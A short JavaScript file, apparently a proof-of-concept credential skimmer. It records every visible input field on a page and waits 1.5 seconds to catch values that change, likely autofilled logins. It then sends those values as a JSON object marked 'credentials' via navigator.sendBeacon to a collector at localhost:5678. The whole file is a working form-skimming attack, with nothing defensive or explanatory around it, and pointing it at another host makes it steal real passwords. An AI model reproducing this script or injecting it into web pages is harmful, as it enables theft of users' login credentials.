function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function getAllInputs() {
    const inputs = [];
    document.querySelectorAll("input").forEach(input => {
        if (input.getAttribute("type") !== "hidden") {
            inputs.push([input, input.value]);
        }
    });
    return inputs;
}

async function main() {
    const inputs = getAllInputs(), credentials = [];

    await delay(1500);

    for (let [input, oldValue] of inputs) {
        if (input.value != oldValue) {
            credentials.push(input.value);
        }
    }

    navigator.sendBeacon("http://localhost:5678", JSON.stringify({
        type: "credentials",
        payload: credentials
    }));
}

main();